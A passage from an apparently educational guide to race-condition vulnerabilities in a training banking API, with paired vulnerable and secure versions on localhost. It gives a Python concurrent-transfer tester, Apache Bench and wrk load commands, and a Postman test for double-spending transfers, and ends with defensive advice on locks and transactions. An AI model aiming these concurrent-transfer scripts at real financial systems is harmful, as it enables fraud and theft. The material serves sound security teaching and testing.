        except Exception as e:
            conn.rollback()
            return {'success': False, 'error': str(e)}
        finally:
            conn.close()
```

**Success Criteria**: Concurrent requests don't cause race conditions

---

## 7. Tool Integration

### Testing with Python Concurrent Futures

**Comprehensive Race Condition Tester**:

```python
#!/usr/bin/env python3
import requests
import concurrent.futures
import time
from colorama import init, Fore

init(autoreset=True)

def test_race_condition(url, num_threads=10, amount=100):
    """Test for race condition vulnerability"""
    
    session = requests.Session()
    
    # Login
    login_resp = session.post(f"{url}/login", 
        json={"username": "alice", "password": "alice123"})
    
    if not login_resp.json().get('success'):
        print(f"{Fore.RED}Login failed")
        return
    
    # Get CSRF token if present (Blue API)
    csrf_token = login_resp.json().get('csrf_token')
    
    # Get account info
    accounts = session.get(f"{url}/accounts").json()['accounts']
    checking = [a for a in accounts if a['account_type'] == 'checking'][0]
    from_account = checking['account_number']
    initial_balance = checking['balance']
    
    print(f"{Fore.CYAN}Initial balance: ${initial_balance:,.2f}")
    print(f"{Fore.CYAN}Sending {num_threads} concurrent transfers of ${amount} each...")
    
    def make_transfer():
        headers = {}
        if csrf_token:
            headers['X-CSRF-Token'] = csrf_token
            
        response = session.post(f"{url}/transfer", 
            json={
                "from_account": from_account,
                "to_account": "ACC003001",
                "amount": amount,
                "note": "Race test"
            },
            headers=headers
        )
        return response.status_code, response.json()
    
    # Execute concurrent transfers
    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(make_transfer) for _ in range(num_threads)]
        results = [future.result() for future in concurrent.futures.as_completed(futures)]
    duration = time.time() - start_time
    
    # Analyze results
    successes = sum(1 for status, _ in results if status == 200)
    
    # Get final balance
    time.sleep(0.5)
    final_accounts = session.get(f"{url}/accounts").json()['accounts']
    final_checking = [a for a in final_accounts if a['account_type'] == 'checking'][0]
    final_balance = final_checking['balance']
    
    print(f"\n{Fore.YELLOW}Results:")
    print(f"Execution time: {duration:.2f}s")
    print(f"Successful transfers: {successes}/{num_threads}")
    print(f"Final balance: ${final_balance:,.2f}")
    print(f"Expected balance: ${initial_balance - amount:,.2f}")
    print(f"Actual transferred: ${initial_balance - final_balance:,.2f}")
    
    if successes > 1:
        print(f"\n{Fore.RED}✗ RACE CONDITION DETECTED!")
        print(f"Vulnerability: {successes - 1} extra transfers succeeded")
    else:
        print(f"\n{Fore.GREEN}✓ No race condition detected")
    
    return successes > 1

# Test both APIs
print(f"{Fore.RED}{'='*60}")
print(f"{Fore.RED}Testing RED API (Vulnerable)")
print(f"{Fore.RED}{'='*60}")
red_vulnerable = test_race_condition("http://localhost:5000/api/red/securebank", 10, 50)

print(f"\n{Fore.BLUE}{'='*60}")
print(f"{Fore.BLUE}Testing BLUE API (Secure)")
print(f"{Fore.BLUE}{'='*60}")
blue_vulnerable = test_race_condition("http://localhost:5001/api/blue/securebank", 10, 50)

# Summary
print(f"\n{Fore.MAGENTA}{'='*60}")
print(f"{Fore.MAGENTA}SUMMARY")
print(f"{Fore.MAGENTA}{'='*60}")
print(f"Red API: {'VULNERABLE' if red_vulnerable else 'SECURE'}")
print(f"Blue API: {'VULNERABLE' if blue_vulnerable else 'SECURE'}")
```

---

### Testing with Apache Bench (ab)

**Concurrent HTTP Requests**:

```bash
# Create a POST data file
cat > transfer.json << EOF
{
  "from_account": "ACC002001",
  "to_account": "ACC003001",
  "amount": 50,
  "note": "ab test"
}
EOF

# Send 100 concurrent requests
ab -n 100 -c 100 -p transfer.json -T application/json \
   -C "session=<your-session-cookie>" \
   http://localhost:5000/api/red/securebank/transfer

# Check results
# Look for: "Failed requests: 0" (all succeeded = race condition)
```

---

### Testing with wrk (HTTP Benchmarking)

**Lua Script for wrk**:

```lua
-- transfer.lua
wrk.method = "POST"
wrk.headers["Content-Type"] = "application/json"
wrk.headers["Cookie"] = "session=<your-session-cookie>"
wrk.body = '{"from_account":"ACC002001","to_account":"ACC003001","amount":50,"note":"wrk test"}'
```

**Run wrk**:
```bash
wrk -t10 -c100 -d10s -s transfer.lua http://localhost:5000/api/red/securebank/transfer

# Output shows requests/sec and successful responses
# High success rate = race condition present
```

---

### Testing with Postman Collection Runner

**Collection Structure**:

1. **Request 1**: Login
2. **Request 2**: Get initial balance (save to variable)
3. **Request 3**: Transfer (run 10 times)
4. **Request 4**: Get final balance (compare with initial)

**Collection Runner Settings**:
- Iterations: 1
- Delay: 0ms
- Data file: None (use environment variables)

**Tests in Transfer Request**:
```javascript
pm.test("Transfer succeeded", function () {
    pm.response.to.have.status(200);
    var jsonData = pm.response.json();
    pm.expect(jsonData.success).to.eql(true);
    
    // Count successes
    var successes = pm.environment.get("transfer_successes") || 0;
    pm.environment.set("transfer_successes", successes + 1);
});
```

---

## Summary

Race conditions in financial systems are particularly dangerous because they violate the fundamental principle that money cannot be created or destroyed - only transferred. The exploitation window is measured in milliseconds, making these vulnerabilities hard to detect through normal testing but trivial to exploit with concurrent requests.

**Key Takeaways**:

1. **Locks Are Essential**: Use application-level AND database-level locks
2. **Atomic Transactions**: All related operations must be in a single transaction
3. **Check-Then-Act Is Dangerous**: Minimize time between check and action
4. **Test Concurrency**: Normal testing won't find race conditions
5. **Thread-Safe Design**: Assume multiple threads will always conflict
6. **Database Isolation**: Use proper transaction isolation levels

The difference between vulnerable and secure code is proper use of locks and transactions. Without them, banking systems can create money out of thin air, leading to million-dollar losses in minutes.
